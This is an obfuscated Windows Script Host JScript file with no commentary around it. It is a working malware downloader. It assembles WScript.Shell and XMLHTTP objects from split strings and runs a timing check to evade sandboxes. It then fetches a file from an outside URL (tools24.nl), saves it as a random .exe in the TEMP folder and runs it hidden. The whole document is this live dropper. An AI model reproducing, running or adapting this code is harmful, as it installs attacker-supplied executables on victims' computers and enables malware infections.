var E = false;
var HV = "Create"+"Object";
var L = function HG() {return WScript[HV]("WScript"+".Shell");}(), AP = 11;
var M0 = "MSXML2"+".XMLHTTP";
var B = 2;
var X = B - 2;
function PF(XN){L["Run"](XN, X, X);};
function FM(){return M0 + "";};
function HZ(B0, VI){X = X * 1; return B0 - VI;};
function U(){return HV;};
/*@cc_on
  @if (@_win32 || @_win64)
    E = true;
  @end
@*/
if (E)
{
var WV = "";
function M(){return 22;};
var X0 = 0; var LV = 0;
function BX()
{
var J = new this["Date"]();
var GJ = J["getUTCMilliseconds"]();
WScript["Sleep"](M());
var J = new this["Date"]();
var W = J["getUTCMilliseconds"]();
WScript["Sleep"](M());
var J = new this["Date"]();
var P = J["getUTCMilliseconds"]();
var X0 = "YK";
X0 = HZ(W, GJ);
var LV = "T";
LV = HZ(P, W);
WV = "open";
return HZ(X0, LV);
}
var AO = false;
var R = false;
for (var ZK = X; ZK < M() * 1; ZK++){if (BX() != X){
AO = true; 
LV = "31" + 11 * X0 + LV; 
R = true; 
break;
}}
function IY() {return ((AO == true) && (AO == R)) ? 1 : X;};
if (AO && IY() && R){
function AG() {return L["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "gNWuRwZM0O.ex" + "e";};
 E0 = FM();
 I = WScript[HV](E0);
 var MJ = 1;
do { 
	for (;MJ;){
	try {
		if (MJ == 1)
		{
			I[WV]("GET", "http://tools24.nl/w8isa", false);
			I["send"]();
			WM = "Sleep";
			MJ = 2;
		}
		WScript[WM](M() + 120); 
		if (I["readystate"] < 2 * 2) continue;
		MJ = X;
		function D(V) {var KP = (1, 2, 3, 4, 5, V); return KP;};
		P0 = WScript[U()]("ADODB.Stream");
		E0 = P0;
		E0[WV]();
		E0["type"] = D(1);
		E0["write"](I["ResponseBody"]);
		P0["position"] = D(X);
		E0["Save" + "ToFile"](AG(), 2);
		P0["cl"+"ose"]();
		JV = AG();
		PF(JV);
	} catch(O){};};
}while (MJ);
}
}

